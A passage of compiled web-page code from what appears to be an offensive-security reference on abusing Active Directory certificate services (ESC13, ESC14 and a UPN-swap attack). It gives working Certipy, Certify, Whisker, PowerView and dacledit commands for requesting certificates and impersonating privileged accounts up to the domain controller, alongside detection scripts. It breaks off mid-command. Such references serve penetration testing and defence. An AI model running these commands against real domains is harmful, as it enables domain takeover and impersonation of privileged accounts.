auth"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dc.pfx"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ldap-shell")])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),e(" flag can be used to set whether to use LDAP or LDAPS")])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[9]||(s[9]=[i("p",null,[e("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) tool can be used.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using default low-privileged group")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"currentuser")])])])],-1),i("p",null,[e("Here, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and want to compromise the domain controller DC$@domain.local.")],-1),i("p",null,[e("First, the user2's credentials are needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example. Here just the "),i("code",null,"msDs-KeyCredentialLink"),e(" modification part with "),i("a",{href:"https://github.com/eladshamir/Whisker",target:"_blank",rel:"noreferrer"},"Whisker"),e(":")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Whisker.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," add "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"target:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user2"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN_CONTROLLER"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"path:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cert.pfx"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"pfx-password"')])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to DC$@domain.local with "),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'DC$@domain.local'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,"A certificate permitting client authentication can be requested in a user2 session.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"User"')])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user2@dmain.local'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,[e("Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an "),i("a",{href:"./../kerberos/delegations/rbcd"},"RBCD"),e(" to fully compromised the domain controller.")],-1)])),_:1})]),_:1}),s[31]||(s[31]=n('<h3 id="esc13-issuance-policiy-with-privileged-group-linked" tabindex="-1">(ESC13) Issuance policiy with privileged group linked <a class="header-anchor" href="#esc13-issuance-policiy-with-privileged-group-linked" aria-label="Permalink to &quot;(ESC13) Issuance policiy with privileged group linked&quot;">​</a></h3><p>For a group to be linked to an issuance policy via <code>msDS-OIDToGroupLink</code> it must meet two requirements:</p><ul><li>Be empty</li><li>Have a universal scope, i.e. be &quot;Forest Wide&quot;. By default, &quot;Forest Wide&quot; groups are &quot;Enterprise Read-only Domain Controllers&quot;, &quot;Enterprise Key Admins&quot;, &quot;Enterprise Admins&quot; and &quot;Schema Admins&quot;</li></ul><p>So, if a user or a computer can enroll on a template that specifies an issuance policy linked to a highly privileged group, the issued certificate privilegies will be mapped to those of the group.</p><p>To exploit ESC13, here are the requirements:</p><ul><li>The controlled principal can enroll to the template and meets all the required issuance policies</li><li>The template specifies an issuance policy</li><li>This policy is linked to a privileged groups via <code>msDS-OIDToGroupLink</code></li><li>The template allows the Client Authentication in its EKU</li><li>All the usual requirements</li></ul>',6)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[10]||(s[10]=[i("p",null,[e("From UNIX-like systems, this "),i("a",{href:"https://github.com/ly4k/Certipy/pull/196",target:"_blank",rel:"noreferrer"},"pull request"),e(" on Certipy (Python) permits to identify a certificate template with an issuance policy, i.e. with the "),i("code",null,"msPKI-Certificate-Policy"),e(" property not empty. Additionally, it verifies if this issuance policy has an OID group link to a group in the property "),i("code",null,"msDS-OIDToGroupLink"),e(".")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," find"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '$USER@$DOMAIN'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` '"$PASSWORD'`),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '$DC_IP'")])])])],-1),i("p",null,[e("If a vulnerable template is found, there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, request a certificate for this template with "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) as usual:")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Vulnerable template'")])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.")],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[11]||(s[11]=[i("p",null,[e("From Windows systems, the ActiveDirectory PowerShell module can be used to identify a certificate template with an issuance policy, i.e. with the "),i("code",null,"msPKI-Certificate-Policy"),e(" property not empty.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-ADObject"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN="'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Vulnerable template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'",'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TemplateContainer"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Properties msPKI"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Certificate"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Policy")])])])],-1),i("p",null,[e("Then, if there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, verify if this issuance policy has an OID group link to a group in the property "),i("code",null,"msDS-OIDToGroupLink"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-ADObject"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN='),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$POLICY_ID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},","),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$OIDContainer"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Properties DisplayName"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msPKI"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Cert"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Template"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"OID"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msDS"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"OIDToGroupLink")])])])],-1),i("p",null,[e("Now, request a certificate for this template with "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) as usual:")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".\\"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:domain\\ca "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Vulnerable template"')])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.")],-1)])),_:1})]),_:1}),s[32]||(s[32]=n('<h3 id="esc14-weak-explicit-mapping" tabindex="-1">(ESC14) Weak explicit mapping <a class="header-anchor" href="#esc14-weak-explicit-mapping" aria-label="Permalink to &quot;(ESC14) Weak explicit mapping&quot;">​</a></h3><p>This attack exploits configuration errors when explicit mapping is set up. To understand this ESC, it is essential to have a good command of <a href="./certificate-templates#certificate-mapping">Certificate mapping</a>.</p><p>There are four possible attack scenarios for exploiting ESC14. In all cases, the following prerequisites must be met:</p><div class="warning custom-block"><p></p><ul><li>the attacker has compromised a victim account and is able to request certificates with this account, and wants to compromise a target account</li><li>the certificate template allows the victim to enroll</li><li>the victim matches all the prerequisites for issuing the certificate</li><li>the certificate template allows for authentication</li><li>if the template has the value <code>CT_FLAG_SUBJECT_ALT_REQUIRE_UPN</code> or <code>CT_FLAG_SUBJECT_ALT_REQUIRE_SPN</code> in the <code>msPKI-Certificate-Name-Flag</code> attribute, then:</li><li>The <code>UseSubjectAltName</code> registry key on the DC must be set to <code>0</code></li><li>authentication can only be performed via PKINIT (Kerberos)</li><li>if the template indicates <code>CT_FLAG_SUBJECT_ALT_REQUIRE_DNS</code> or <code>CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS</code> in the <code>msPKI-Certificate-Name-Flag</code> attribute:</li><li>the victim must be a machine</li><li>authentication can only be performed via PKINIT (Kerberos)</li><li>if the template indicates <code>CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL</code> or <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code> in the <code>msPKI-Certificate-Name-Flag</code> attribute, one of the following prerequisites must be validated:</li><li>the certificate template uses version <code>1</code> of the scheme</li><li>the victim has his <code>mail</code> attribute configured</li><li>the attacker has write access to the victim&#39;s <code>mail</code> attribute</li></ul></div><p>Sufficient DACL to write <code>altSecurityIdentities</code> attributes can be detected like this:</p>',5)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[12]||(s[12]=[i("p",null,[e("From UNIX-like systems, this can be done with "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),e("'s dacledit.py (Python).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dacledit.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'read'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -principal"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlled_object'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target_object'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'user':'password'")])])])],-1),i("p",null,"It is also possible to view the necessary DACL in BloodHound.",-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[13]||(s[13]=[i("p",null,[e("From Windows systems, this can be done with "),i("a",{href:"https://github.com/JonasBK/Powershell/blob/master/Get-WriteAltSecIDACEs.ps1",target:"_blank",rel:"noreferrer"},"Get-WriteAltSecIDACEs.ps1"),e(" (PowerShell).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Get the ACEs for a single object based on DistinguishedName")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-WriteAltSecIDACEs"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"DistinguishedName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"dc=domain,dc=local"')]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Get ACEs of all AD objects under domain root by piping them into Get-WriteAltSecIDACEs")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-ADObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Filter "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"*"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"dc=domain,dc=local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Get-WriteAltSecIDACEs")])])])],-1),i("p",null,"It is also possible to view the necessary DACL in BloodHound.",-1)])),_:1})]),_:1}),s[33]||(s[33]=n('<p>Detection of weak explicit mapping can be done with the <a href="https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1" target="_blank" rel="noreferrer">Get-AltSecIDMapping.ps1</a> script (PowerShell) from a Windows machine. At the time of writing (May 16st, 2024), there is no solution to perform this check from a UNIX-like system.</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Get-AltSecIDMapping</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">SearchBase </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;CN=Users,DC=domain,DC=local&quot;</span></span></code></pre></div><h4 id="esc14-a-write-access-on-altsecurityidentities" tabindex="-1">(ESC14 A) Write access on altSecurityIdentities <a class="header-anchor" href="#esc14-a-write-access-on-altsecurityidentities" aria-label="Permalink to &quot;(ESC14 A) Write access on altSecurityIdentities&quot;">​</a></h4><p>The attacker has write access to the <code>altSecurityIdentities</code> attribute of the target. He can enrol on a certificate as the victim and create an explicit mapping for the target by modifying its <code>altSecurityIdentities</code> attribute and pointing it to the obtained certificate. The certificate can then be used to authenticate as the target.</p><p>Write rights to <code>altSecurityIdentities</code> can be obtained via the following <a href="./../dacl/">DACL</a>:</p><ul><li>Write property <code>altSecurityIdentities</code></li><li>Write property <code>Public-Information</code></li><li>Write property (all)</li><li><code>WriteDACL</code></li><li><code>WriteOwner</code></li><li><code>GenericWrite</code></li><li><code>GenericAll</code></li><li>Owner</li></ul><p>For PKINIT authentication, no additional requirements are necessary. For Schannel authentication, the <code>CertificateMappingMethods</code> key must be set to <code>0x8</code> (default value).</p>',7)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[14]||(s[14]=[i("p",null,"// TODO",-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[15]||(s[15]=[i("p",null,[e("From Windows systems, "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) can be used to enroll on a certificate template.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:domain\\ca "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:Machine "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"machine")])])])],-1),i("p",null,[e("Then, the "),i("code",null,"certutil"),e(" utility permits to merge the PFX and dump the serial number and the issuer DN from it.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"certutil "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MergePFX 